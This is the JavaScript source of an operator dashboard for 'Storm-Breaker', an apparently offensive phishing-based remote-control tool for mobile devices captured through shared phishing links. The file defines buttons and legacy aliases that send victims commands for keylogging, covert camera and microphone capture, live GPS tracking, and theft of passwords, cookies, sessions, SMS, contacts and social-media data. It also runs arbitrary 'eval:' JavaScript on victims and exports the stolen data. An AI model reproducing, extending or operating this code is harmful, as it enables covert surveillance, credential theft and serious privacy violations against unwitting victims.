/**
 * Storm-Breaker Ultimate Mobile Control Dashboard
 * Enhanced with device fingerprinting, live battery, grouped commands, and real-time output
 */

let selectedMobileClient = null;
let mobileClients = [];
let mobileRefreshInterval = null;
let responseRetryCount = 0;
const MAX_RETRIES = 15;
let mobileOutputHistory = [];
let mobileCommandHistory = [];
let mobileCmdHistoryIdx = -1;
let autoScrollMobile = true;

// Command categories for organized UI
const MOBILE_COMMANDS = {
    '📸 Camera & Media': {
        'screenshot': { label: 'Screenshot', icon: 'fa-camera', cmd: 'start_screenshot', desc: 'Capture screen' },
        'photo_front': { label: 'Front Camera', icon: 'fa-user', cmd: 'capture_front_camera', desc: 'Front photo' },
        'photo_back': { label: 'Back Camera', icon: 'fa-camera-retro', cmd: 'capture_back_camera', desc: 'Back photo' },
        'record_audio': { label: 'Record Audio', icon: 'fa-microphone', cmd: 'record_audio', desc: '30s mic' },
        'screen_record': { label: 'Screen Record', icon: 'fa-video', cmd: 'start_screen_record', desc: 'Record screen' },
        'stop_record': { label: 'Stop Record', icon: 'fa-stop', cmd: 'stop_screen_record', desc: 'Stop recording' },
    },
    '🔑 Keylogger & Input': {
        'start_kl': { label: 'Start Keylogger', icon: 'fa-keyboard', cmd: 'start_keylogger', desc: 'Log keys' },
        'stop_kl': { label: 'Stop Keylogger', icon: 'fa-stop-circle', cmd: 'stop_keylogger', desc: 'Stop logging' },
        'get_kl': { label: 'Get Keylogs', icon: 'fa-file-alt', cmd: 'get_keylogs', desc: 'Retrieve logs' },
        'form_data': { label: 'Form Data', icon: 'fa-wpforms', cmd: 'get_form_data', desc: 'Input fields' },
        'click_data': { label: 'Click Data', icon: 'fa-mouse-pointer', cmd: 'get_click_data', desc: 'Click tracking' },
        'clipboard': { label: 'Clipboard', icon: 'fa-clipboard', cmd: 'monitor_clipboard', desc: 'Clipboard data' },
    },
    '📍 Location & Network': {
        'live_loc': { label: 'Live Location', icon: 'fa-map-marker-alt', cmd: 'watch_location', desc: 'GPS tracking' },
        'stop_loc': { label: 'Stop Location', icon: 'fa-map-marker', cmd: 'stop_watch_location', desc: 'Stop GPS' },
        'wifi_pw': { label: 'WiFi Passwords', icon: 'fa-wifi', cmd: 'get_wifi_passwords', desc: 'Saved WiFi' },
        'netinfo': { label: 'Network Info', icon: 'fa-network-wired', cmd: 'get_network_info', desc: 'IP & DNS' },
    },
    '📱 Social Media': {
        'whatsapp': { label: 'WhatsApp', icon: 'fa-comment-dots', cmd: 'get_whatsapp', desc: 'Extract WA' },
        'facebook': { label: 'Facebook', icon: 'fa-thumbs-up', cmd: 'get_facebook', desc: 'Extract FB' },
        'instagram': { label: 'Instagram', icon: 'fa-heart', cmd: 'get_instagram', desc: 'Extract IG' },
        'twitter': { label: 'Twitter/X', icon: 'fa-feather-alt', cmd: 'get_twitter', desc: 'Extract X' },
        'telegram': { label: 'Telegram', icon: 'fa-paper-plane', cmd: 'get_telegram', desc: 'Extract TG' },
    },
    '💾 Data Extraction': {
        'contacts': { label: 'Contacts', icon: 'fa-address-book', cmd: 'get_contacts', desc: 'Phone book' },
        'sms': { label: 'SMS Messages', icon: 'fa-sms', cmd: 'get_sms', desc: 'Text messages' },
        'call_logs': { label: 'Call Logs', icon: 'fa-phone', cmd: 'get_call_logs', desc: 'Call history' },
        'photos': { label: 'All Photos', icon: 'fa-images', cmd: 'get_photos', desc: 'Gallery' },
        'files': { label: 'Files', icon: 'fa-folder', cmd: 'get_files', desc: 'File system' },
        'apps': { label: 'Installed Apps', icon: 'fa-th', cmd: 'get_installed_apps', desc: 'App list' },
    },
    '🔓 Credentials': {
        'saved_pw': { label: 'Saved Passwords', icon: 'fa-key', cmd: 'get_saved_passwords', desc: 'Browser passwords' },
        'cookies': { label: 'Cookies', icon: 'fa-cookie-bite', cmd: 'eval:document.cookie', desc: 'Session cookies' },
        'storage': { label: 'Local Storage', icon: 'fa-database', cmd: 'eval:JSON.stringify({...localStorage})', desc: 'LocalStorage' },
        'sessions': { label: 'Steal Sessions', icon: 'fa-user-secret', cmd: 'steal_session', desc: 'Active sessions' },
        'history': { label: 'Browser History', icon: 'fa-history', cmd: 'get_browser_history', desc: 'Browsing history' },
        'bookmarks': { label: 'Bookmarks', icon: 'fa-bookmark', cmd: 'get_bookmarks', desc: 'Saved bookmarks' },
    },
    '⚡ Advanced': {
        'all_data': { label: 'Extract ALL', icon: 'fa-download', cmd: 'get_all_data', desc: 'Everything at once' },
        'notifications': { label: 'Notifications', icon: 'fa-bell', cmd: 'monitor_notifications', desc: 'Push notifications' },
        'downloads': { label: 'Downloads', icon: 'fa-cloud-download-alt', cmd: 'get_downloads', desc: 'Downloaded files' },
    },
};

function initMobileControl() {
    refreshMobileClients();
    refreshMobileCaptures();
    mobileRefreshInterval = setInterval(refreshMobileClients, 4000);
    document.getElementById('btn-refresh-mobile')?.addEventListener('click', refreshMobileClients);

    // Build command panel
    buildCommandPanel();

    // Custom command input
    var customInput = document.getElementById('mobile-custom-cmd');
    if (customInput) {
        customInput.addEventListener('keydown', function (e) {
            // History navigation
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (mobileCommandHistory.length > 0 && mobileCmdHistoryIdx < mobileCommandHistory.length - 1) {
                    mobileCmdHistoryIdx++;
                    this.value = mobileCommandHistory[mobileCommandHistory.length - 1 - mobileCmdHistoryIdx];
                }
                return;
            }
            if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (mobileCmdHistoryIdx > 0) {
                    mobileCmdHistoryIdx--;
                    this.value = mobileCommandHistory[mobileCommandHistory.length - 1 - mobileCmdHistoryIdx];
                } else {
                    mobileCmdHistoryIdx = -1;
                    this.value = '';
                }
                return;
            }

            if (e.key === 'Enter') {
                sendCustomMobileCommand();
            }
        });
    }
}

function buildCommandPanel() {
    var panel = document.getElementById('mobile-command-panel');
    if (!panel) return;

    var html = '';
    Object.keys(MOBILE_COMMANDS).forEach(function (category) {
        html += `<div class="mb-3">
            <div class="text-[10px] text-slate-500 uppercase tracking-wider mb-2 font-bold">${category}</div>
            <div class="grid grid-cols-3 gap-1.5">`;

        Object.keys(MOBILE_COMMANDS[category]).forEach(function (key) {
            var cmd = MOBILE_COMMANDS[category][key];
            html += `<button onclick="sendMobileCommand('${cmd.cmd}')" 
                class="px-2 py-2 bg-slate-800 hover:bg-slate-700 border border-slate-700 hover:border-slate-600 rounded-lg text-[10px] text-slate-300 hover:text-white transition-all group text-left"
                title="${cmd.desc}">
                <i class="fas ${cmd.icon} text-blue-400 group-hover:text-blue-300 mr-1"></i>
                <span>${cmd.label}</span>
            </button>`;
        });

        html += `</div></div>`;
    });

    panel.innerHTML = html;
}

async function refreshMobileClients() {
    try {
        const response = await fetch('/api/mobile/clients');
        const data = await response.json();
        mobileClients = data.clients || [];

        const listEl = document.getElementById('mobile-client-list');
        if (!listEl) return;

        // Update count badge
        var badge = document.getElementById('mobile-count-badge');
        if (badge) badge.textContent = mobileClients.length;

        if (mobileClients.length === 0) {
            listEl.innerHTML = `<div class="text-center py-8">
                <i class="fas fa-mobile-alt text-3xl text-slate-700 mb-3"></i>
                <div class="text-slate-600 text-sm">No mobile devices</div>
                <div class="text-slate-700 text-[10px] mt-1">Share a phishing link to capture devices</div>
            </div>`;
            return;
        }

        listEl.innerHTML = mobileClients.map(client => {
            var clientUid = client.uid || '';
            var clientInfo = client.info || {};
            var isSelected = selectedMobileClient === client.uid;
            var batteryLevel = clientInfo.battery?.level || 'N/A';
            var batteryCharging = clientInfo.battery?.charging ? '⚡' : '';
            var batteryColor = 'text-slate-400';
            if (typeof batteryLevel === 'number') {
                if (batteryLevel > 60) batteryColor = 'text-emerald-400';
                else if (batteryLevel > 20) batteryColor = 'text-yellow-400';
                else batteryColor = 'text-red-400';
            }

            var platform = clientInfo.platform || 'Unknown';
            var platformIcon = 'fa-mobile-alt';
            if (platform.toLowerCase().includes('android')) platformIcon = 'fa-android';
            else if (platform.toLowerCase().includes('ios') || platform.toLowerCase().includes('iphone')) platformIcon = 'fa-apple';

            var ageStr = client.seconds_ago < 60 ? client.seconds_ago + 's ago' :
                         client.seconds_ago < 3600 ? Math.floor(client.seconds_ago / 60) + 'm ago' :
                         Math.floor(client.seconds_ago / 3600) + 'h ago';

            return `
            <div class="mobile-client-item ${isSelected ? 'bg-blue-600/20 border-blue-500 ring-1 ring-blue-500/30' : 'bg-slate-800 border-slate-700'} 
                 border rounded-lg p-3 cursor-pointer hover:bg-slate-700 transition-all mb-2"
                 onclick="selectMobileClient('${clientUid}')">
                <div class="flex items-center justify-between mb-2">
                    <div class="flex items-center space-x-2">
                        <i class="fab ${platformIcon} text-slate-400"></i>
                        <span class="text-xs font-bold text-slate-300 truncate">${clientUid.substring(0, 16)}${clientUid.length > 16 ? '...' : ''}</span>
                    </div>
                    <span class="text-[10px] px-2 py-0.5 rounded-full ${client.seconds_ago < 30 ? 'bg-emerald-500/20 text-emerald-400 animate-pulse' : 'bg-yellow-500/20 text-yellow-400'}">
                        ${ageStr}
                    </span>
                </div>
                <div class="grid grid-cols-2 gap-1 text-[10px] text-slate-500">
                    <div><i class="fas fa-mobile-alt w-3"></i> ${platform}</div>
                    <div><i class="fas fa-network-wired w-3"></i> ${client.ip}</div>
                    <div class="${batteryColor}"><i class="fas fa-battery-half w-3"></i> ${batteryLevel}${typeof batteryLevel === 'number' ? '%' : ''} ${batteryCharging}</div>
                    <div><i class="fas fa-desktop w-3"></i> ${clientInfo.screenWidth || '?'}×${clientInfo.screenHeight || '?'}</div>
                    ${clientInfo.connection ? `<div><i class="fas fa-wifi w-3"></i> ${clientInfo.connection.type || '?'}</div>` : ''}
                    ${clientInfo.cores ? `<div><i class="fas fa-microchip w-3"></i> ${clientInfo.cores} cores</div>` : ''}
                </div>
            </div>`;
        }).join('');
    } catch (e) {
        console.error('Failed to refresh mobile clients:', e);
    }
}

function escapeMobileHtml(str) {
    if (str === null || str === undefined) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

async function refreshMobileCaptures() {
    var grid = document.getElementById('mobile-captures');
    if (!grid) return;

    try {
        var response = await fetch('/api/mobile/captures');
        var data = await response.json();
        var captures = data.captures || [];

        if (captures.length === 0) {
            grid.innerHTML = '<div class="col-span-full text-center text-slate-600 py-4 text-xs">No captures yet</div>';
            return;
        }

        grid.innerHTML = captures.map(function (cap) {
            var url = escapeMobileHtml(cap.url);
            var isImage = cap.type === 'screenshot' || cap.type === 'camera';
            var isVideo = cap.type === 'screen_record';

            var preview;
            if (isImage) {
                preview = '<img src="' + url + '" class="w-full h-20 object-cover rounded cursor-pointer" onclick="window.open(this.src)">';
            } else if (isVideo) {
                preview = '<video src="' + url + '" class="w-full h-20 object-cover rounded" controls></video>';
            } else {
                preview = '<audio src="' + url + '" class="w-full" controls></audio>';
            }

            var label = {
                'screenshot': 'Screenshot',
                'camera': 'Camera Photo',
                'audio': 'Microphone',
                'screen_record': 'Screen Recording'
            }[cap.type] || cap.type;

            return '<div class="bg-slate-800 border border-slate-700 rounded-lg p-2">'
                + preview
                + '<div class="text-[10px] text-slate-300 mt-1 truncate">' + escapeMobileHtml(label) + '</div>'
                + '<div class="text-[9px] text-slate-500 truncate">' + escapeMobileHtml(cap.uid || '') + '</div>'
                + '<div class="text-[9px] text-slate-600 truncate">' + escapeMobileHtml(cap.timestamp || '') + '</div>'
                + '</div>';
        }).join('');
    } catch (e) {
        console.error('Failed to refresh mobile captures:', e);
    }
}

function selectMobileClient(uid) {
    selectedMobileClient = uid;
    const client = mobileClients.find(c => c.uid === uid);
    const clientUid = client ? (client.uid || '') : '';
    const info = client ? (client.info || {}) : {};

    if (client) {
        const infoEl = document.getElementById('mobile-device-info');
        const infoContent = document.getElementById('mobile-info-content');

        if (infoEl && infoContent) {
            infoEl.classList.remove('hidden');

            var batteryHtml = '';
            if (info.battery) {
                var level = info.battery.level || 0;
                var charging = info.battery.charging ? ' ⚡ Charging' : '';
                var barColor = level > 60 ? 'bg-emerald-500' : level > 20 ? 'bg-yellow-500' : 'bg-red-500';
                batteryHtml = `
                    <div class="col-span-2 mt-1">
                        <div class="flex justify-between text-[10px] mb-1">
                            <span class="text-slate-500"><i class="fas fa-battery-full"></i> Battery</span>
                            <span class="text-white">${level}%${charging}</span>
                        </div>
                        <div class="w-full bg-slate-800 rounded-full h-1.5">
                            <div class="${barColor} rounded-full h-1.5 transition-all" style="width: ${level}%"></div>
                        </div>
                    </div>`;
            }

            infoContent.innerHTML = `
                <div class="text-slate-400"><i class="fas fa-fingerprint"></i> UID:</div>
                <div class="text-white font-mono text-[10px] truncate">${clientUid}</div>
                <div class="text-slate-400"><i class="fas fa-mobile-alt"></i> Platform:</div>
                <div class="text-white">${info.platform || 'Unknown'}</div>
                <div class="text-slate-400"><i class="fas fa-desktop"></i> Screen:</div>
                <div class="text-white">${info.screenWidth || '?'}×${info.screenHeight || '?'} (${info.pixelRatio || 1}x)</div>
                <div class="text-slate-400"><i class="fas fa-globe"></i> Language:</div>
                <div class="text-white">${info.language || 'Unknown'}</div>
                <div class="text-slate-400"><i class="fas fa-clock"></i> Timezone:</div>
                <div class="text-white">${info.timezone || 'Unknown'}</div>
                <div class="text-slate-400"><i class="fas fa-microchip"></i> CPU:</div>
                <div class="text-white">${info.cores || '?'} cores</div>
                <div class="text-slate-400"><i class="fas fa-memory"></i> RAM:</div>
                <div class="text-white">${info.memory || '?'} GB</div>
                <div class="text-slate-400"><i class="fas fa-network-wired"></i> IP:</div>
                <div class="text-blue-400">${client.ip}</div>
                ${info.connection ? `
                    <div class="text-slate-400"><i class="fas fa-wifi"></i> Connection:</div>
                    <div class="text-white">${info.connection.type || '?'} ${info.connection.downlink ? '(' + info.connection.downlink + ' Mbps)' : ''}</div>
                ` : ''}
                <div class="text-slate-400"><i class="fas fa-user-agent"></i> User Agent:</div>
                <div class="text-slate-500 text-[9px] col-span-2 truncate">${info.userAgent || 'Unknown'}</div>
                ${batteryHtml}
            `;
        }

        addMobileOutput(`✅ Connected to device: ${uid.substring(0, 20)}...`, 'success');
        addMobileOutput(`📱 ${info.platform || 'Unknown'} | 📍 ${client.ip} | 🔋 ${info.battery?.level || '?'}%`, 'info');

        if (typeof playNotificationSound === 'function') playNotificationSound();
    }

    refreshMobileClients();
}

async function sendMobileCommand(command) {
    if (!selectedMobileClient) {
        addMobileOutput('❌ Please select a mobile device first!', 'error');
        if (typeof GrowlNotification !== 'undefined') {
            GrowlNotification.notify({ title: 'No Device', description: 'Select a mobile device first', type: 'error', position: 'top-right' });
        }
        return;
    }

    // Save to history
    mobileCommandHistory.push(command);
    mobileCmdHistoryIdx = -1;

    addMobileOutput(`📤 ${command}`, 'cmd');

    try {
        const response = await fetch('/api/mobile/send_command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                uid: selectedMobileClient,
                command: command
            })
        });

        if (response.ok) {
            addMobileOutput('⏳ Awaiting response...', 'pending');
            responseRetryCount = 0;
            setTimeout(() => getMobileResponse(), 2000);
        } else {
            addMobileOutput('❌ Server rejected command (HTTP ' + response.status + ')', 'error');
        }
    } catch (e) {
        addMobileOutput('❌ Network error: ' + e.message, 'error');
    }
}

async function getMobileResponse() {
    if (!selectedMobileClient) return;

    try {
        const response = await fetch(`/api/mobile/get_response/${selectedMobileClient}`);
        const data = await response.json();

        if (data.output) {
            // Try to parse and pretty-print JSON
            var output = data.output;
            try {
                var parsed = JSON.parse(output);
                output = JSON.stringify(parsed, null, 2);
            } catch (e) { /* not JSON, show as-is */ }

            addMobileOutput('📥 ' + output, 'response');
            responseRetryCount = 0;

            // Save to history
            mobileOutputHistory.push({
                command: mobileCommandHistory[mobileCommandHistory.length - 1] || 'unknown',
                output: output,
                timestamp: Date.now()
            });
        } else {
            responseRetryCount++;
            if (responseRetryCount < MAX_RETRIES) {
                setTimeout(() => getMobileResponse(), 2000);
            } else {
                addMobileOutput('⏰ Timeout after ' + (MAX_RETRIES * 2) + 's — device may be offline', 'warning');
                responseRetryCount = 0;
            }
        }
    } catch (e) {
        addMobileOutput('❌ Error: ' + e.message, 'error');
        responseRetryCount = 0;
    }
}

function sendCustomMobileCommand() {
    const input = document.getElementById('mobile-custom-cmd');
    if (!input) return;

    const code = input.value.trim();
    if (!code) {
        addMobileOutput('❌ Empty command', 'error');
        return;
    }

    // Auto-prefix eval: for raw JS
    var cmd = code;
    if (!code.startsWith('eval:') && !code.startsWith('get_') && !code.startsWith('start_') && !code.startsWith('stop_') && !code.startsWith('steal_') && !code.startsWith('monitor_') && !code.startsWith('record_') && !code.startsWith('capture_') && !code.startsWith('watch_')) {
        cmd = 'eval:' + code;
    }

    sendMobileCommand(cmd);
    input.value = '';
}

function addMobileOutput(text, type) {
    const outputEl = document.getElementById('mobile-output');
    if (!outputEl) return;

    const timestamp = new Date().toLocaleTimeString();
    const line = document.createElement('div');

    var colorClass = 'text-slate-300';
    switch (type) {
        case 'success': colorClass = 'text-emerald-400'; break;
        case 'error': colorClass = 'text-red-400'; break;
        case 'warning': colorClass = 'text-yellow-400'; break;
        case 'info': colorClass = 'text-blue-400'; break;
        case 'cmd': colorClass = 'text-purple-400 font-bold'; break;
        case 'response': colorClass = 'text-slate-200 bg-slate-800/50 rounded px-2 py-1 border-l-2 border-blue-500'; break;
        case 'pending': colorClass = 'text-slate-500 italic'; break;
    }

    line.className = `${colorClass} text-xs mb-1 font-mono`;

    // Wrap long outputs
    if (text.length > 200) {
        line.innerHTML = `<span class="text-slate-600">[${timestamp}]</span> <pre class="whitespace-pre-wrap mt-1 ${colorClass}">${escapeHtml(text)}</pre>`;
    } else {
        line.innerHTML = `<span class="text-slate-600">[${timestamp}]</span> ${escapeHtml(text)}`;
    }

    outputEl.appendChild(line);
    if (autoScrollMobile) {
        outputEl.scrollTop = outputEl.scrollHeight;
    }
}

function escapeHtml(text) {
    var div = document.createElement('div');
    div.appendChild(document.createTextNode(text));
    return div.innerHTML;
}

function clearMobileOutput() {
    var outputEl = document.getElementById('mobile-output');
    if (outputEl) outputEl.innerHTML = '';
}

function exportMobileOutput() {
    if (mobileOutputHistory.length === 0) {
        addMobileOutput('No data to export', 'warning');
        return;
    }

    var text = JSON.stringify(mobileOutputHistory, null, 2);
    var blob = new Blob([text], { type: 'application/json' });
    var link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'mobile_session_' + (selectedMobileClient || 'all').substring(0, 8) + '_' + new Date().toISOString().slice(0, 10) + '.json';
    link.click();

    if (typeof GrowlNotification !== 'undefined') {
        GrowlNotification.notify({ title: 'Exported', description: 'Mobile session data saved', type: 'success', position: 'top-right' });
    }
}

// Expose functions globally
window.selectMobileClient = selectMobileClient;
window.sendMobileCommand = sendMobileCommand;
window.sendCustomMobileCommand = sendCustomMobileCommand;
window.clearMobileOutput = clearMobileOutput;
window.exportMobileOutput = exportMobileOutput;

// Legacy function aliases
window.extractPhotos = function() { sendMobileCommand('eval:document.cookie'); };
window.extractGmail = function() { sendMobileCommand("eval:window.open('https://mail.google.com', '_blank'); 'Gmail opened'"); };
window.extractChrome = function() { sendMobileCommand('eval:JSON.stringify({cookies: document.cookie, localStorage: {...localStorage}, sessionStorage: {...sessionStorage}})'); };
window.extractWhatsApp = function() { sendMobileCommand('get_whatsapp'); };
window.extractFacebook = function() { sendMobileCommand('get_facebook'); };
window.extractInstagram = function() { sendMobileCommand('get_instagram'); };
window.startKeylogger = function() { sendMobileCommand('start_keylogger'); };
window.stopKeylogger = function() { sendMobileCommand('stop_keylogger'); };
window.getKeylogs = function() { sendMobileCommand('get_keylogs'); };
window.startScreenshot = function() { sendMobileCommand('start_screenshot'); };
window.stopScreenshot = function() { sendMobileCommand('stop_screenshot'); };
window.recordAudio = function() { sendMobileCommand('record_audio'); };
window.watchLocation = function() { sendMobileCommand('watch_location'); };
window.stopWatchLocation = function() { sendMobileCommand('stop_watch_location'); };
window.getFormData = function() { sendMobileCommand('get_form_data'); };
window.getClickData = function() { sendMobileCommand('get_click_data'); };
window.stealSession = function() { sendMobileCommand('steal_session'); };
window.getAllData = function() { sendMobileCommand('get_all_data'); };
window.getContacts = function() { sendMobileCommand('get_contacts'); };
window.getSMS = function() { sendMobileCommand('get_sms'); };
window.getCallLogs = function() { sendMobileCommand('get_call_logs'); };
window.getPhotos = function() { sendMobileCommand('get_photos'); };
window.getVideos = function() { sendMobileCommand('get_videos'); };
window.getFiles = function() { sendMobileCommand('get_files'); };
window.getInstalledApps = function() { sendMobileCommand('get_installed_apps'); };
window.getTwitter = function() { sendMobileCommand('get_twitter'); };
window.getTelegram = function() { sendMobileCommand('get_telegram'); };
window.getWiFiPasswords = function() { sendMobileCommand('get_wifi_passwords'); };
window.getSavedPasswords = function() { sendMobileCommand('get_saved_passwords'); };
window.getBrowserHistory = function() { sendMobileCommand('get_browser_history'); };
window.getBookmarks = function() { sendMobileCommand('get_bookmarks'); };
window.getDownloads = function() { sendMobileCommand('get_downloads'); };
window.monitorClipboard = function() { sendMobileCommand('monitor_clipboard'); };
window.monitorNotifications = function() { sendMobileCommand('monitor_notifications'); };
window.startScreenRecord = function() { sendMobileCommand('start_screen_record'); };
window.stopScreenRecord = function() { sendMobileCommand('stop_screen_record'); };

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    const mobileTab = document.querySelector('[data-tab="mobile"]');
    if (mobileTab) {
        mobileTab.addEventListener('click', () => {
            if (!mobileRefreshInterval) {
                initMobileControl();
            }
        });
    }
});
